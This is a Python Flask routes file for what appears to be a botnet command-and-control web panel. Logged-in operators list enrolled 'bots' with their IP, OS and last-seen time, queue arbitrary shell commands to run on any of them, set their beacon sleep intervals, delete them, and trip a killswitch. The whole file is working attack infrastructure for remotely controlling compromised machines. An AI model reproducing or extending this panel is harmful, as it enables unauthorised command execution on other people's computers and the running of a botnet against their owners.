from app import app, master, db
from flask import render_template, g, abort, request
from flask.ext.security import current_user, login_required
from app.forms import RunCommand, SetSleepInterval
from threading import Thread
from app.models import Bot
import json

@app.before_first_request
def before_first():
    master_t = Thread(target=master.main)
    master_t.start()

@app.before_request
def before_request():
    if app.killswitch:
        abort(500)
    g.queue = master.queue
    g.user = current_user

@app.route('/')
@app.route('/home')
@app.route('/index')
def index():
    return render_template("index.html", title="Home")

@app.route('/kill')
@login_required
def kill():
    app.killswitch = 1
    abort(500)

@app.route('/testcmd')
@login_required
def testcmd():
    g.queue['127.0.0.1'].append("run:okay dad")
    b = Bot.query.filter_by(ip="127.0.0.1").one()
    return str(b.last_seen)

@app.route("/api/clients/list", methods=["GET"])
@login_required
def api_clients_list():
    bots = [ Bot.query.filter_by(ip=c).one() for c in g.queue.keys() ]
    data = {}
    for bot in bots:
        data[bot.id] = dict()
        data[bot.id]["IP"] = bot.ip
        data[bot.id]["OS"] = bot.os
        data[bot.id]["last_seen"] = bot.last_seen
        data[bot.id]["last_response"] = bot.last_response
        data[bot.id]["set_interval"] = bot.sleep_interval
        data[bot.id]['cmd_queue'] = g.queue[bot.ip]
    return json.dumps(data)

@app.route("/api/clients/cmd/<int:id>", methods=["POST"])
@login_required
def api_clients_cmd(id):
    data = json.loads(request.get_data())
    bot = Bot.query.filter_by(id=id).one()
    g.queue[bot.ip].append("run:"+data['cmd'])
    return "", 200

@app.route("/api/clients/clearq/<int:id>")
@login_required
def api_clients_clearq(id):
    bot = Bot.query.filter_by(id=id).one()
    del g.queue[bot.ip][:]
    return "", 200

@app.route("/api/clients/sleep/<int:id>", methods=["POST"])
@login_required
def api_clients_sleep(id):
    data = json.loads(request.get_data())
    try: int(data['interval'])
    except: return "", 500
    bot = Bot.query.filter_by(id=id).one()
    g.queue[bot.ip].append("set sleep:"+data['interval'])
    bot.sleep_interval = int(data['interval'])
    db.session.add(bot)
    db.session.commit()
    return "", 200

@app.route("/api/clients/delete/<int:id>")
@login_required
def api_clients_delete(id):
    try:
        bot = Bot.query.filter_by(id=id).one()
    except: return "", 500
    del g.queue[bot.ip]
    db.session.delete(bot)
    db.session.commit()
    return "", 200

@app.route("/bots")
@login_required
def bots():
    cmd_form = RunCommand()
    int_form = SetSleepInterval()
    return render_template("bots.html", title="Bots", cmd_form=cmd_form, int_form=int_form)
